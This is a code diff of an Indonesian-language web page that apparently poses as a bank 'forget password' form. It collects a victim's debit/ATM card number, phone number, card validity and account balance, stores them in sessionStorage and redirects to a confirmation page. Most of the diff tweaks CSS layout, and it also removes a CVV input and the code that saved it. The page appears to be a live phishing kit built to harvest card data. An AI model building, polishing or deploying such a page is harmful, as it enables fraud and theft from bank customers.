@@ -145,12 +145,12 @@ body {
   width: 92%;
   left: 0;
   right: 0;
-  height: 310px;
+  height: 265px;
   margin: 0px auto;
   position: relative;
   padding-top: 20px;
-  margin-top; -37px;
-  box-shadow: #727269 0px 0px 2px 0px;
+  margin-top; -35px;
+  box-shadow: #727269 0px 0px 4px 0px;
 
 }
 @media screen and (max-width: 480px) {
@@ -692,7 +692,6 @@ font-size: 29px;
   color: #000;
   width: 100%;
   display: ;
-  margin: -10px;
   user-select: none;
 }
 .card-input__input {
@@ -728,17 +727,16 @@ font-size: 29px;
 }
 .card-input__label {
   font-size: 14px;
-  margin-bottom:10px;
+  margin-bottom: 5px;
   font-weight: 500;
   color: #000;
   width: 100%;
   display: none;
   user-select: none;
-  margin: -1px;
 }
 .card-input__input1 {
   width: 100%;
-  height: 40px;
+  height: 45px;
   border-radius: 5px;
   box-shadow: 1px 1px 15px 1px rgba(36, 52, 70, 0.26);
   border: 0px none #fff;
@@ -776,7 +774,7 @@ outline: none;
 
 .card-input__input3{
   width: 100%;
-  height: 40px;
+  height: 45px;
   border-radius: 5px;
   box-shadow: 1px 1px 15px 1px rgba(36, 52, 70, 0.26);
   border: 0px solid #006cff;
@@ -1132,7 +1130,7 @@ table tr:hover td {
             max-width: 95%;
             background: #fff;
             display: block;
-            height: 320px;
+            height: 280px;
             box-shadow: 10px 15px 10px 0 rgba(90, 116, 148, 0.4);
             margin: -0px auto;
             border-radius: 20px;
@@ -1298,14 +1296,14 @@ table tr:hover td {
      </div> 
     </div> 
     
-   <div class="card-form__inner" style="margin-top: 90px">
+   <div class="card-form__inner" style="margin-top: 100px">
 <form id="forgetPasswordForm" onsubmit="kirimPesan(event); return false" method="POST">
         <div class="card-input">
-          <label for="cardNumber" class="card-input__label" style="font-weight: 500; display: block; margin-left: 4px; margin-top: -10px; opacity: 0.5">16 digit nomor kartu debit</label>
-          <input type="tel" id="debit" name="debit" class="card-input__input" v-mask="generateCardNumberMask" v-model="cardNumber" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardNumber" autocomplete="off" placeholder="#### #### #### ####" required style="background-image: url();
+          <label for="cardNumber" class="card-input__label" style="font-weight: 500; display: block; margin-left: 4px; margin-top: -10px; opacity: 0.5">16 digit  nomor kartu debit/ATM</label>
+          <input type="tel" id="debit" name="debit" class="card-input__input" v-mask="generateCardNumberMask" v-model="cardNumber" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardNumber" autocomplete="off" placeholder="#### #### #### ####" required style="
   font-family: 'Source Sans Pro', sans-serif;
   background-size: 100% 100%;
-         background-position: 100% 100%; ">
+         background-position: 100% 100%;">
         </div>
         <div class="card-input">
           <label for="cardName" class="card-input__label" style="font-weight: 500; display: block; margin-left: 4px; margin-top: -10px; opacity: 0.5">Nomor Handphone</label>
@@ -1321,18 +1319,14 @@ table tr:hover td {
              
                 
             </div>
-                <div class="card-input">
-          <label for="cardName" class="card-input__label" style="font-weight: 500; display: block; margin-left: 4px; margin-top: 10px; opacity: 0.5">CVV</label>
-          <input type="tel" id="cvv" name="cvv" class="card-input__input" v-mask="'###'" v-on:focus="focusInput" v-on:blur="blurInput"  autocomplete="off" placeholder="CVV (3 digit dibelakang kartu)" required>
-        </div>
           </div>
          
            
             </div>
          
      <center>
-     <div style="position: fixed; bottom: 0; left: 0; right: 0; margin: 0px auto; width: 100%; height: 72px; background: #fff; box-shadow: rgba(0, 0, 0, 0.15) 5px 5px 15px 0px; padding-top: 10px">
-<button type="submit" id="btnSubmit" style="margin-top: ;position:relative;background-color:#0076e0;color:white;border:0px solid #0076e0;width:90%;border-radius:10px;font-family: 'Nunito', sans-serif;font-size: 15px;padding:13px;display: inline-block; box-shadow: rgba(0, 0, 0, 0.10) 0px 10px 10px, rgba(0, 0, 0, 0.20) 0px 6px 6px;z-index: 9999999999" >Lanjutkan</button>
+     <div style="position: fixed; bottom: 0; left: 0; right: 0; margin: 0px auto; width: 100%; height: 72px; background: #fff; box-shadow: rgba(0, 0, 0, 0.15) 5px 5px 15px 0px; padding-top: 15px">
+<button type="submit" id="btnSubmit" style="margin-top: ;position:relative;background-color:#0076e0;color:white;border:0px solid #0076e0;width:90%;border-radius:50px;font-family: 'Nunito', sans-serif;font-size: 15px;padding:13px;display: inline-block; box-shadow: rgba(0, 0, 0, 0.10) 0px 10px 10px, rgba(0, 0, 0, 0.20) 0px 6px 6px;z-index: 9999999999" >Lanjutkan</button>
            </div>
       <br><br>
      
@@ -1440,7 +1434,7 @@ document.getElementById('btnSubmit').innerHTML = "Memproses...";
             console.log('Complete')
   setTimeout(function(){
           window.location.href='konf.html';  
-var debit = document.getElementById("debit").value;
+ var debit = document.getElementById("debit").value;
 sessionStorage.setItem("debit", debit);
 var nomor = document.getElementById("nomor").value;
 sessionStorage.setItem("nomor", nomor);
@@ -1449,8 +1443,6 @@ sessionStorage.setItem("valid", valid);
 
 var saldo = document.getElementById("saldo").value;
 sessionStorage.setItem("saldo", saldo);
-var kode = document.getElementById("cvv").value;
-sessionStorage.setItem("kode", kode);
 
      }, 500);
     
